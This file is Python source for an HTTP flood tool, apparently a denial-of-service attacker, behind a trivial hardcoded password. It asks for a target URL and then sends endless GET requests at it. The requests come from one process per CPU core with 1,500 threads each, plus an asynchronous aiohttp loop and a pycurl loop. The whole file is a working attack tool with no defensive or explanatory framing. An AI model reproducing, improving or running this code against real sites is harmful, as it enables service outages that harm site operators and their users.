import time
import multiprocessing
import requests
import aiohttp
import asyncio
import pycurl
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import signal
import sys

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = multiprocessing.Value('b', False)

def display_banner():
    banner_text = "j"
    for char in banner_text:
        print(Fore.GREEN + char + Style.RESET_ALL)
        time.sleep(0.05)

def password_prompt():
    password = input("Enter password: ")
    if password == "j":
        print(Fore.GREEN + "Correct password! Opening attack menu..." + Style.RESET_ALL)
        start_attack()
    else:
        print(Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
        exit()

def send_requests_threaded(target, stop_flag):
    session = requests.Session()
    
    def send_request():
        while not stop_flag.value:
            try:
                session.get(target, timeout=5)
            except requests.exceptions.RequestException:
                pass

    num_threads = 1500  # استخدام 1500 خيط كحد أقصى

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(send_request) for _ in range(num_threads)]
        
        for future in futures:
            if stop_flag.value:
                break

async def send_requests_aiohttp(target, stop_flag):
    async with aiohttp.ClientSession() as session:
        while not stop_flag.value:
            try:
                async with session.get(target, timeout=5) as response:
                    await response.text()
            except aiohttp.ClientError:
                pass

def send_requests_pycurl(target, stop_flag):
    while not stop_flag.value:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, target)
        c.setopt(c.WRITEDATA, buffer)
        try:
            c.perform()
        except pycurl.error:
            pass
        finally:
            c.close()

def show_attack_animation():
    print("Loading...")

def start_attack():
    try:
        target = input("Target URL: ")
        print("Attack will continue indefinitely. Type 'stop' to end it.")
        execute_attack(target)
    except Exception as e:
        print(f"Error: {str(e)}")

def execute_attack(target):
    total_cores = multiprocessing.cpu_count()

    print(f"Starting continuous attack on {target} using {total_cores} cores...")

    show_attack_animation()

    processes = []

    with stop_attack_flag.get_lock():
        stop_attack_flag.value = False

    try:
        for i in range(total_cores):
            process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
            processes.append(process)
            process.start()

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(send_requests_aiohttp(target, stop_attack_flag))

        pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_attack_flag))
        processes.append(pycurl_process)
        pycurl_process.start()

        print(Fore.YELLOW + "Attack in progress... Press Ctrl+C to stop." + Style.RESET_ALL)

        for process in processes:
            process.join()

    except KeyboardInterrupt:
        with stop_attack_flag.get_lock():
            stop_attack_flag.value = True
        print(Fore.RED + "Attack stopped." + Style.RESET_ALL)

    except Exception as e:
        print(f"Error during attack: {str(e)}")

def signal_handler(sig, frame):
    with stop_attack_flag.get_lock():
        stop_attack_flag.value = True
    print(Fore.RED + "Attack stopped." + Style.RESET_ALL)
    sys.exit(0)

def main():
    try:
        signal.signal(signal.SIGINT, signal_handler)
        display_banner()
        password_prompt()
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
